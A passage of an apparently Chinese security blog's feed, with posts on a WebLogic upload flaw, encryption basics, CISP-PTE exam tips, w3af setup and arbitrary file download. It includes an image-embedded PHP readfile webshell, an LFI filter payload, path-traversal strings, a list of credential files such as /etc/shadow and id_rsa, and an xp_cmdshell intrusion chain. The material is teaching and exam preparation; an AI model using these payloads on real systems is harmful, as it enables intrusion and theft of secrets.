%&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/05/18/EOG091.png" alt="EOG091.png"></p><p>访问shell</p><p><a href="https://imgchr.com/i/EOG6BD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/18/EOG6BD.png" alt="EOG6BD.png"></a></p><h2 id="漏洞-修复建议"><a href="#漏洞-修复建议" class="headerlink" title="漏洞-修复建议"></a>漏洞-修复建议</h2><ul><li>升级补丁</li><li>如果不依赖T3协议进行JVM通信，禁用T3协议。</li></ul><p>升级补丁</p><p>Oracle官方更新链接地址：<a href="https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html</a></p><p>禁用T3协议</p><ol><li>进入WebLogic控制台，在base_domain配置页面中，进入安全选项卡页面，点击筛选器，配置筛选器。</li><li>在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入* * 7001 deny t3 t3s</li><li>保存生效（无需重启）</li></ol><p><strong>注：转载请注明出处:lilifengcode.github.io</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/19/EXaxld.jpg&quot; alt=&quot;EXaxld.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞-介绍&quot;&gt;&lt;a href=&quot;#漏洞-介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞-介
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mimadd</title>
    <link href="http://lilifengcode.github.io/post/5a9d2d30.html"/>
    <id>http://lilifengcode.github.io/post/5a9d2d30.html</id>
    <published>2019-04-17T15:50:36.000Z</published>
    <updated>2019-10-31T14:12:33.056Z</updated>
    
    <content type="html"><![CDATA[<h1 id="非对称加密和对称加密"><a href="#非对称加密和对称加密" class="headerlink" title="非对称加密和对称加密"></a>非对称加密和对称加密</h1><p><img src="https://s2.ax1x.com/2019/10/18/KZ3Rjx.png" alt></p><p>非对称加密和对称加密在加密和解密过程、加密解密速度、传输的安全性上都有所不同，具体介绍如下：</p><h2 id="1．加密和解密过程不同"><a href="#1．加密和解密过程不同" class="headerlink" title="1．加密和解密过程不同"></a>1．加密和解密过程不同</h2><p>对称加密过程和解密过程使用的同一个密钥，加密过程相当于用原文+密钥可以传输出密文，同时解密过程用密文-密钥可以推导出原文。但非对称加密采用了两个密钥，一般使用公钥进行加密，使用私钥进行解密。</p><p>非对称加密流程图：</p><p><a href="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/2f738bd4b31c870179fcaa8e297f9e2f0708ff14.jpg" target="_blank" rel="noopener"><img src="file:///C:%5CUsers%5Clilifeng%5CAppData%5CLocal%5CTemp%5Cmsohtmlclip1%5C01%5Cclip_image001.png" alt="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/wh%3D600%2C800/sign=fd5af9722634349b74536683f9da39f6/2f738bd4b31c870179fcaa8e297f9e2f0708ff14.jpg"></a></p><p>对称加密流程图：</p><p><a href="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e7cd7b899e510fb358a5c3f3d733c895d1430c11.jpg" target="_blank" rel="noopener"><img src="file:///C:%5CUsers%5Clilifeng%5CAppData%5CLocal%5CTemp%5Cmsohtmlclip1%5C01%5Cclip_image002.png" alt="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/wh%3D600%2C800/sign=5d50e38dfcd3572c66b794daba234f1f/e7cd7b899e510fb358a5c3f3d733c895d1430c11.jpg"></a></p><h2 id="2．加密解密速度不同"><a href="#2．加密解密速度不同" class="headerlink" title="2．加密解密速度不同"></a>2．加密解密速度不同</h2><p>对称加密解密的速度比较快，适合数据比较长时的使用。非对称加密和解密花费的时间长、速度相对较慢，只适合对少量数据的使用。</p><h2 id="3．传输的安全性不同"><a href="#3．传输的安全性不同" class="headerlink" title="3．传输的安全性不同"></a>3．传输的安全性不同</h2><p>对称加密的过程中无法确保密钥被安全传递，密文在传输过程中是可能被第三方截获的，如果密码本也被第三方截获，则传输的密码信息将被第三方破获，安全性相对较低。</p><p>非对称加密算法中私钥是基于不同的算法生成不同的随机数，私钥通过一定的加密算法推导出公钥，但私钥到公钥的推导过程是单向的，也就是说公钥无法反推导出私钥。所以安全性较高。</p><h2 id="4-常见加密方式"><a href="#4-常见加密方式" class="headerlink" title="4.  常见加密方式"></a>4.  常见加密方式</h2><p>在非对称加密中使用的主要算法有：RSA、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法）</p><p>在对称加密中使用的主要算法有：DES（Data Encryption Standard）、3DES（Triple DES）、AES（Advanced Encryption Standard）、Blowfish</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>百度</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;非对称加密和对称加密&quot;&gt;&lt;a href=&quot;#非对称加密和对称加密&quot; class=&quot;headerlink&quot; title=&quot;非对称加密和对称加密&quot;&gt;&lt;/a&gt;非对称加密和对称加密&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/10/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Talking About CISP PTE</title>
    <link href="http://lilifengcode.github.io/post/fd616792.html"/>
    <id>http://lilifengcode.github.io/post/fd616792.html</id>
    <published>2019-04-17T15:50:34.000Z</published>
    <updated>2019-06-28T08:25:01.143Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://imgchr.com/i/EX0DQH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/19/EX0DQH.jpg" alt="EX0DQH.jpg"></a></p><h2 id="CISP-PTE-介绍"><a href="#CISP-PTE-介绍" class="headerlink" title="CISP PTE 介绍"></a>CISP PTE 介绍</h2><p>注册信息安全专业人员-渗透测试，英文为 Certified Information Security Professional – Penetration Test Engineer ，简称 CISP-PTE。证书持有人员主要从事信息安全技术领域网站渗透测试工作，具有规划测试方案、 编写项目测试计划、编写测试用例、测试报告的基本知识和能力。</p><h2 id="CISP-PTE-考试模式"><a href="#CISP-PTE-考试模式" class="headerlink" title="CISP PTE 考试模式"></a>CISP PTE 考试模式</h2><ol><li>考试时间： 4个小时/240分钟</li><li>考试模式： 上机操作</li><li>考试机系统： windows server 2003</li></ol><h2 id="CISP-PTE-题型"><a href="#CISP-PTE-题型" class="headerlink" title="CISP PTE 题型"></a>CISP PTE 题型</h2><ul><li>选择题【20分 20道】</li><li>实验题【50分 5道 5个key】 </li><li>综合题【30分 1道 3个key】</li><li>分值占比</li></ul><p><img src="https://s2.ax1x.com/2019/04/11/A72JAA.png" alt></p><h2 id="CISP-PTE-大纲"><a href="#CISP-PTE-大纲" class="headerlink" title="CISP PTE 大纲"></a>CISP PTE 大纲</h2><p><img src="https://s2.ax1x.com/2019/04/11/A72K1K.png" alt></p><h2 id="CISP-PTE-经验"><a href="#CISP-PTE-经验" class="headerlink" title="CISP PTE 经验"></a>CISP PTE 经验</h2><h3 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h3><ul><li>看经验，看基础，加密、密码学相关的也会考点儿</li></ul><h3 id="实验题"><a href="#实验题" class="headerlink" title="实验题"></a>实验题</h3><ul><li><p>第一题：一般是sql注入，考的是sqlmap用法</p><p>  举例：slqmap -u “<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a> –dbs –batch –level 5 –risk 3 –tamper=space2plus</p></li><li><p>第二题：文件上传，考的是黑名单绕过，文件头绕过或者MIME绕过等等</p><p>  举例：我在考试的时候比较特殊，过滤了eval等参数；我直接用<?php readfile("../key.php");?>和图片合成一句话木马，上传时用burp修改文件后缀为php3 ，菜刀链接就好<br>  或者file_get_contents 读文件</p></li><li><p>第三题：文件包含，伪协议</p><p>  举例：php://filter/read=convert.base64-encode/resource=;</p></li><li><p>第四题：爆破</p><p>  举例：burp intruder用法</p></li><li><p>第五题：日志分析，白送</p><p>  举例：ctrl+f 搜索关键状态码 200 之类的；或者get get 突然 post 的日志</p></li></ul><h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><ul><li>大概思路是=&gt;nmap 扫描端口=&gt;御剑扫目录=&gt;找到登录框爆破=&gt;分析zip网站备份文件=&gt;连接数据库=&gt;开启XP_CMDSHELL=&gt;关闭防火墙，加用户或者写shell，lcx端口转发=&gt;mstsc连接主机</li><li>综合题一共三个key,第一个在登录框处；第二个在连到数据库的数据库列表里面；第三个在远程主机桌面上</li></ul><h2 id="实战举例"><a href="#实战举例" class="headerlink" title="实战举例"></a>实战举例</h2><ul><li><p>sql注入  </p><p>ps:我用的payload，参数不一定都是有用的，只是习惯了</p><p><img src="https://s2.ax1x.com/2019/04/12/AqnlEn.png" alt></p><p><img src="https://s2.ax1x.com/2019/04/12/Aqndb9.png" alt></p></li><li><p>命令执行 </p><p>ps:grep用好！！！</p><p><img src="https://s2.ax1x.com/2019/04/12/AquGdA.png" alt></p></li><li><p>文件包含</p><p>ps:因为是要获取key值，所以凡是能带出数据的协议都值得背下来</p><p><img src="https://s2.ax1x.com/2019/04/12/AquXQO.png" alt></p></li></ul><h2 id="CISP-PTE-学习链接"><a href="#CISP-PTE-学习链接" class="headerlink" title="CISP PTE 学习链接"></a>CISP PTE 学习链接</h2><ol><li>漏洞银行第86期[B站搜】</li><li><a href="http://zgao.top/2018/06/" target="_blank" rel="noopener">http://zgao.top/2018/06/</a></li><li>web安全深度剖析【刷完】</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://imgchr.com/i/EX0DQH&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/19/EX0DQH.jpg&quot; alt=&quot;EX0DQH.jpg
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>W3af Scanner</title>
    <link href="http://lilifengcode.github.io/post/6daa940c.html"/>
    <id>http://lilifengcode.github.io/post/6daa940c.html</id>
    <published>2019-04-17T15:49:42.000Z</published>
    <updated>2019-06-28T08:25:01.160Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2019/05/22/V9qBct.jpg" alt="V9qBct.jpg"></p><h2 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h2><h3 id="w3af-window版"><a href="#w3af-window版" class="headerlink" title="w3af-window版"></a>w3af-window版</h3><p>1.下载链接：<a href="https://pan.baidu.com/s/17viEKD8qhv6ivIP-Jwwx1A" target="_blank" rel="noopener">https://pan.baidu.com/s/17viEKD8qhv6ivIP-Jwwx1A</a><br>提取码：4p92 </p><p>2.安装之后桌面上多两个文件w3af Console 和 w3af GUI,点击 w3af GUI即可</p><p><img src="https://s2.ax1x.com/2019/05/16/EbAI2t.png" alt></p><p><a href="https://imgchr.com/i/EqewHf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/17/EqewHf.png" alt="EqewHf.png"></a></p><h3 id="w3af-linux版"><a href="#w3af-linux版" class="headerlink" title="w3af-linux版"></a>w3af-linux版</h3><p>安装步骤：</p><p>我的安装环境是kali,所以你要看好你的更新源，要不后面部分命令无法执行</p><p>leafpad /etc/apt/sources.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#aliyun 阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"># ustc 中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line">#deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"></span><br><span class="line"># kali 官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>1.git clone <a href="https://github.com/andresriancho/w3af.git" target="_blank" rel="noopener">https://github.com/andresriancho/w3af.git</a></p><p><img src="https://s2.ax1x.com/2019/05/17/EqKPxJ.png" alt="EqKPxJ.png"></p><p>2.执行w3af_console</p><p>ls</p><p>cd w3af</p><p>ls</p><p><img src="https://s2.ax1x.com/2019/05/17/EqQ1Et.png" alt="EqQ1Et.png"></p><p>./w3af_console  </p><p><a href="https://imgchr.com/i/Eq8lQS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/17/Eq8lQS.png" alt="Eq8lQS.png"></a></p><p>发现有好多依赖包没装，在/tmp目录下有w3af_dependency_install.s文件，执行它即可安装所有依赖包</p><p><img src="https://s2.ax1x.com/2019/05/17/Eq8Twd.png" alt="Eq8Twd.png"></p><p> ./w3af_dependency_install.sh 报错可以试试sudo  ./w3af_dependency_install.sh</p><p><img src="https://s2.ax1x.com/2019/05/17/EqG9Ts.png" alt="EqG9Ts.png"></p><p>执行完之后，还是报错啊</p><p><img src="https://s2.ax1x.com/2019/05/17/EqNTi9.png" alt="EqNTi9.png"></p><p>执行 apt-get build-dep python-lxml</p><p><img src="https://s2.ax1x.com/2019/05/17/EqaxCd.png" alt="EqaxCd.png"></p><p>安装npm执行apt-get install npm </p><p><img src="https://s2.ax1x.com/2019/05/17/EqdHRs.png" alt="EqdHRs.png"></p><p>再次执行./w3af_dependency_install.sh </p><p><a href="https://imgchr.com/i/Eq0z8J" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/17/Eq0z8J.png" alt="Eq0z8J.png"></a></p><p>其实就差最后一个npm的安装，如果不行，再单独执行一下npm install -g retire</p><p><img src="https://s2.ax1x.com/2019/05/17/EqoL4J.png" alt="EqoL4J.png"></p><p>执行./w3af_console</p><p><img src="https://s2.ax1x.com/2019/05/17/Eqovg1.png" alt="Eqovg1.png"></p><p>接下来执行./w3af_gui</p><p><img src="https://s2.ax1x.com/2019/05/17/EqL7Hx.png" alt="EqL7Hx.png"></p><p>让我执行sudo pip install xdot==0.6</p><p><img src="https://s2.ax1x.com/2019/05/17/EqO2qI.png" alt="EqO2qI.png"></p><p>执行sudo apt-get install graphviz</p><p><img src="https://s2.ax1x.com/2019/05/17/EqXpz4.png" alt="EqXpz4.png"></p><p>再次执行./w3af_gui提示no module named webkit </p><p><img src="https://s2.ax1x.com/2019/05/17/EqXuSe.png" alt="EqXuSe.png"></p><p>接下来下载和安装依赖包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.br.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb</span><br><span class="line">wget http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libjavascriptcoregtk-1.0-0_2.4.11-3_amd64.deb</span><br><span class="line">wget http://ftp.br.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb</span><br><span class="line">wget http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libwebkitgtk-1.0-0_2.4.11-3_amd64.deb</span><br><span class="line">dpkg -i libjavascriptcoregtk-1.0-0_2.4.11-3_amd64.deb</span><br><span class="line">dpkg -i python-support_1.0.15_all.deb</span><br><span class="line">dpkg -i libwebkitgtk-1.0-0_2.4.11-3_amd64.deb</span><br><span class="line">dpkg -i python-webkit_1.1.8-3_amd64.deb</span><br><span class="line">apt –fix-broken install</span><br></pre></td></tr></table></figure><p>执行之后还是有点问题 webkit这个模块一直有问题</p><p><img src="https://s2.ax1x.com/2019/05/17/Eqjsud.png" alt="Eqjsud.png"></p><p>百度一下，需要加个更新源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://ftp.de.debian.org/debian buster main</span><br></pre></td></tr></table></figure><p>再次更新:apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y </p><p><img src="https://s2.ax1x.com/2019/05/17/Eqza40.png" alt="Eqza40.png"></p><p>执行：</p><p>wget  <a href="http://ftp.de.debian.org/debian/pool/main/i/icu/[libicu-dev_57.1-6+deb9u2_amd64.deb](http://ftp.de.debian.org/debian/pool/main/i/icu/libicu-dev_57.1-6+deb9u2_amd64.deb)" target="_blank" rel="noopener">http://ftp.de.debian.org/debian/pool/main/i/icu/[libicu-dev_57.1-6+deb9u2_amd64.deb](http://ftp.de.debian.org/debian/pool/main/i/icu/libicu-dev_57.1-6+deb9u2_amd64.deb)</a></p><p>dpkg -i <a href="http://ftp.de.debian.org/debian/pool/main/i/icu/libicu-dev_57.1-6+deb9u2_amd64.deb" target="_blank" rel="noopener">libicu-dev_57.1-6+deb9u2_amd64.deb</a></p><p>apt-get install python-gtksourceview2</p><p>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mv /var/lib/dpkg/info     /var/lib/dpkg/info_bak</span><br><span class="line"></span><br><span class="line">mkdir /var/lib/dpkg/info</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get -f install </span><br><span class="line"></span><br><span class="line">mv /var/lib/dpkg/info/*        /var/lib/dpkg/info_bak/</span><br><span class="line"></span><br><span class="line">rm -rf /var/lib/dpkg/info</span><br><span class="line"></span><br><span class="line">mv /var/lib/dpkg/info_bak /var/lib/dpkg/info</span><br></pre></td></tr></table></figure><p>注：如果有题，可以去找最新得<a href="http://ftp.de.debian.org/debian/pool/main/i/icu/" target="_blank" rel="noopener">http://ftp.de.debian.org/debian/pool/main/i/icu/</a></p><p><img src="https://s2.ax1x.com/2019/05/17/EL9pAs.png" alt="EL9pAs.png"></p><p>安装完之后，运行./w3af.gui即可</p><p><strong>注：转载请注明出处:lilifengcode.github.io</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/05/22/V9qBct.jpg&quot; alt=&quot;V9qBct.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;w3af&quot;&gt;&lt;a href=&quot;#w3af&quot; class=&quot;headerlink&quot; title=&quot;w3af&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>4K 8K HD Photo Resources Website</title>
    <link href="http://lilifengcode.github.io/post/4a999914.html"/>
    <id>http://lilifengcode.github.io/post/4a999914.html</id>
    <published>2019-04-17T15:49:25.000Z</published>
    <updated>2019-06-29T13:44:49.532Z</updated>
    
    <content type="html"><![CDATA[<p> <img src="https://s2.ax1x.com/2019/06/29/ZlQSXt.jpg" alt="ZlQSXt.jpg"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没啥说的…</p><p>搞点8K图片，放在自己得博客上或者当壁纸</p><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><ul><li><a href="https://wall.alphacoders.com/" target="_blank" rel="noopener">https://wall.alphacoders.com/</a></li></ul><p><img src="https://s2.ax1x.com/2019/06/28/ZM7AVs.png" alt="ZM7AVs.png"></p><ul><li><a href="https://uhdpixel.com/" target="_blank" rel="noopener">https://uhdpixel.com/</a></li></ul><p><img src="https://s2.ax1x.com/2019/06/28/ZM7n2T.png" alt="ZM7n2T.png"></p><ul><li><a href="http://pic.netbian.com/" target="_blank" rel="noopener">http://pic.netbian.com/</a></li></ul><p><img src="https://s2.ax1x.com/2019/06/28/ZM7dMD.png" alt="ZM7dMD.png"></p><ul><li><a href="https://pixabay.com" target="_blank" rel="noopener">https://pixabay.com</a></li></ul><p><img src="https://s2.ax1x.com/2019/06/28/ZMH9F1.png" alt="ZMH9F1.png"></p><ul><li><a href="http://www.bizhiku.net/" target="_blank" rel="noopener">http://www.bizhiku.net/</a></li></ul><p><img src="https://s2.ax1x.com/2019/06/28/ZMHkQO.png" alt="ZMHkQO.png"></p><p> 注：除了彼岸是会员制，其他都可以直接下载的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; &lt;img src=&quot;https://s2.ax1x.com/2019/06/29/ZlQSXt.jpg&quot; alt=&quot;ZlQSXt.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>web安全漏洞-任意文件下载漏洞</title>
    <link href="http://lilifengcode.github.io/post/f300c807.html"/>
    <id>http://lilifengcode.github.io/post/f300c807.html</id>
    <published>2019-04-17T13:55:00.000Z</published>
    <updated>2019-06-28T08:25:01.160Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://imglf4.nosdn0.126.net/img/d0pJMFNGSnJ5LzdrekNMM0dHSW1KWWI1RE1FUEtqL29PQWlMOU5UNll5dVQzK2J2azRHR3NnPT0.jpg" alt></p><h1 id="web安全漏洞-任意文件下载漏洞"><a href="#web安全漏洞-任意文件下载漏洞" class="headerlink" title="web安全漏洞-任意文件下载漏洞"></a>web安全漏洞-任意文件下载漏洞</h1><p><strong>php代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'</span>; </span><br><span class="line"><span class="keyword">echo</span> file_get_contents($filename); </span><br><span class="line">header(<span class="string">'Content-Type: imgage/jpeg'</span>);       </span><br><span class="line">header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);    <span class="comment">//Content-Disposition 响应头，设置文件在浏览器打开还是下载</span></span><br><span class="line">header(<span class="string">'Content-Lengh: '</span>.filesize($filename));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="window环境演示"><a href="#window环境演示" class="headerlink" title="window环境演示"></a>window环境演示</h2><p>环境介绍</p><p>C盘根目录-存放了flag.txt</p><p>www目录-有phpinfo.php</p><p>将上面代码，运行，访问，burpsuite抓包</p><p><img src="http://imglf6.nosdn.127.net/img/d0pJMFNGSnJ5LzROZDZxcHJvSytNZTEyUlAzSFRxUHppZEhaU2ZlNWE2RSs1QTkzdjFZTXdBPT0.png?imageView" alt></p><h2 id="linux环境演示"><a href="#linux环境演示" class="headerlink" title="linux环境演示"></a>linux环境演示</h2><p>演示环境为bee蜂箱</p><p>首先打开虚拟机，查看环境IP</p><p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzRvN1BDb3pQQWptcmRrd0xIdUNUZmZKaW5zcXJmcG03V1kwaXZRclBkNUtBPT0.png?imageView" alt></p><p>本地浏览器访问</p><p><img src="http://imglf5.nosdn.127.net/img/d0pJMFNGSnJ5LzdoSXJzeHNCQTcxOEVvTUhGZWxNMTd3SjRkWjkrT25hcjJQUlZnaGRZWVd3PT0.png?imageView" alt></p><p>burpsuite抓包</p><p><img src="http://imglf3.nosdn.127.net/img/d0pJMFNGSnJ5LzZUVnZwRVRWbG1jK1NSdjY5VENKaG9LamdrcVR3TnYzZHRxemdlcUgzM0h3PT0.png?imageView" alt></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>*<em>.php?file=/etc/passwd<br>*</em></strong>.php?file=../../../../../../../../etc/passwd<br>****.php?file=../../../../../../../../etc/passwd%00</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁用../的使用</li><li>使用open_basedir将下载文件限定为一个指定目录里</li><li>正则严格判断用户输入参数的格式</li></ul><h2 id="漏洞探测-google语法"><a href="#漏洞探测-google语法" class="headerlink" title="漏洞探测-google语法"></a>漏洞探测-google语法</h2><ul><li>inrul:”readfile.php?file=“</li></ul><h2 id="可探测敏感信息"><a href="#可探测敏感信息" class="headerlink" title="可探测敏感信息"></a>可探测敏感信息</h2><ul><li>Linux：</li></ul><ul><li><p>​    /root/.ssh/authorized_keys</p></li><li><p>​    /root/.ssh/id_rsa</p></li><li><p>​    /root/.ssh/id_ras.keystore</p></li><li><p>​    /root/.ssh/known_hosts</p></li><li><p>​    /etc/httpd/conf/httpd.conf</p></li><li><p>​    /root/.bash_history</p></li><li><p>​    /root/.mysql_history</p></li><li><p>​    /proc/self/fd/fd[0-9]*(文件标识符)</p></li><li><p>​    /proc/mounts</p></li><li><p>​    /porc/config.gz</p></li><li><p>​    /etc/passwd</p></li><li><p>​    /etc/shadow</p></li><li><p>​    /etc/my.cnf</p></li></ul><ul><li>Windows：</li></ul><ul><li><p>​    C:\Program Files\mysql\my.ini </p></li><li><p>​    C:\Program Files\mysql\data\mysql\user.MYD  </p></li><li><p>​    C:\Windows\php.ini </p></li><li><p>​    C:\Windows\my.ini  </p></li><li><p>​    C:\boot.ini  </p></li><li><p>​    C:\Windows\System32\inetsrv\MetaBase.xml  </p></li><li><p>​    C:\Windows\repair\sam  //存储系统初次安装的密码</p></li></ul><h2 id="代码审计挖掘经验"><a href="#代码审计挖掘经验" class="headerlink" title="代码审计挖掘经验"></a>代码审计挖掘经验</h2><ul><li><p>查看网站，相应功能点—-查找相应代码文件</p></li><li><p>搜索文件读取得函数</p><p>file_get_contents(),fopen（），readfile(),fread(),fgets()等。</p></li><li><p>文件包含函数include</p></li></ul><p>  <strong><em>经典举例—-phpcms  v9 任意文件读取漏洞</em></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://imglf4.nosdn0.126.net/img/d0pJMFNGSnJ5LzdrekNMM0dHSW1KWWI1RE1FUEtqL29PQWlMOU5UNll5dVQzK2J2azRHR3NnPT0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h1 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>About Kali linux Penetration Test</title>
    <link href="http://lilifengcode.github.io/post/8dab69ed.html"/>
    <id>http://lilifengcode.github.io/post/8dab69ed.html</id>
    <published>2019-04-17T13:54:28.000Z</published>
    <updated>2019-06-28T08:25:01.160Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://imglf3.nosdn0.126.net/img/d0pJMFNGSnJ5LzQ5dW85VzhtSmJ3NmxobE1DTHA2QjE0TlJ5OTlVd0FiM2VkTkhsWTM3UFBnPT0.jpg" alt></p><h2 id="域名注册信息"><a href="#域名注册信息" class="headerlink" title="域名注册信息"></a>域名注册信息</h2><ol><li>whois  </li></ol><p>用法： whois  <a href="http://www.xxxx.com" target="_blank" rel="noopener">www.xxxx.com</a></p><p><img src="http://imglf4.nosdn.127.net/img/d0pJMFNGSnJ5LzZDeXAyQ1hMRzI5L3I1a2JiQmRRUm1RZTVXMVYvUk1jNXd6UDFhUmdTb01RPT0.jpg?imageView" alt></p><ol start="2"><li>dig</li></ol><p>用法： dig <a href="http://www.xxxx.com/123.123.123" target="_blank" rel="noopener">www.xxxx.com/123.123.123</a>.*</p><p><img src="http://imglf4.nosdn.127.net/img/d0pJMFNGSnJ5LzZqNmh4SEZvSDJ1NHBsdVkwdUZ5SmVuVjFhR3hUQzloS00zZlNzak5VSTB3PT0.jpg?imageView" alt></p><h2 id="DNS查询-dnsrecon"><a href="#DNS查询-dnsrecon" class="headerlink" title="DNS查询  dnsrecon"></a>DNS查询  dnsrecon</h2><p>这是我最喜欢的一款DNS查询工具，具体可以看我以前文章。</p><h2 id="情报收集-Recon-NG"><a href="#情报收集-Recon-NG" class="headerlink" title="情报收集   Recon-NG"></a>情报收集   Recon-NG</h2><ol><li>用法：root@kali:~# recon-ng</li></ol><p><img src="http://imglf5.nosdn.127.net/img/d0pJMFNGSnJ5LzUyVUxNSldrNjJUYkQwdFBwZkRKOFdIRUJ0anMrOTRNL2I2SzJ0MllTOTJRPT0.jpg?imageView" alt></p><p><strong>启动的时候报错显示红色【！】请参考链接—</strong><a href="http://www.freebuf.com/sectool/102256.html" target="_blank" rel="noopener"><strong>FREEBUF</strong></a></p><ol start="2"><li>用法：[recon-ng][default] &gt; help</li></ol><p><img src="http://imglf6.nosdn.127.net/img/d0pJMFNGSnJ5LzUyVUxNSldrNjJUU05BSnVuV2tVN01QcHFJbU5CR1RFb2E1MnN3UEFEa1BRPT0.jpg?imageView" alt></p><p>add             